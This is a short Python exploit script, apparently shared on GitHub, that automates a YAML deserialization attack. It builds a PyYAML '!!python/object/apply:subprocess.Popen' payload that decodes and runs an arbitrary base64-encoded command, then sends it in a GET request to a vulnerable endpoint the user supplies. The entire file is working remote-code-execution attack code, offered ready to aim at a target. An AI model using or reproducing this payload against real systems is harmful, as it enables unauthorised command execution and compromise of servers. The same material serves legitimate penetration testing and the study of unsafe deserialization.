#!/usr/bin/env python3
# Iceish - https://github.com/Iceish
#
# This script automate yaml deserialization attack with python payload.
# Edit the main function to customize the script for your target.

import requests
import base64
import argparse

def generate_payload(cmd):
    cmd = base64.b64encode(str.encode(cmd)).decode('ascii')
    payload = f"""\
!!python/object/apply:subprocess.Popen
- !!python/tuple
  - python
  - -c
  - "__import__('os').system(str(__import__('base64').b64decode('{cmd}').decode()))"\
"""
    return base64.b64encode(str.encode(payload)).decode('ascii')


if __name__ == "__main__":

    parser = argparse.ArgumentParser(description='Exploit YAML Python Deserialization')
    parser.add_argument('url', type=str, help='url to the vulnerable endpoint')
    parser.add_argument('cmd', type=str, help='command to execute')
    args = parser.parse_args()
    payload = generate_payload(args.cmd)
    url = args.url

    #
    # EDIT ENDPOINT HERE
    # USE 'url' and 'payload' variables
    #
    res = requests.get(url + '/' + payload)
    
    print(res.status_code)
